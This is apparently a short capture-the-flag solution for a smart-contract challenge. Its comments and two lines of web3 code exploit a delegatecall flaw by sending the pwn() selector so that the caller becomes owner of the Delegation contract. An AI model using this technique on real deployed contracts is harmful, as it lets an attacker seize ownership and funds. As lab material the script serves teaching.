// delegatecall executes code in caller contract context
// meaning that the `owner=msg.sender` will modify `Delegation` contract's owner
// also, delegatecall parameter is the 4 first bytes of the sha3 of function signature.

const functionAddress = web3.sha3('pwn()').slice(0, 10);
sendTransaction({from: player, to: instance, data: functionAddress});
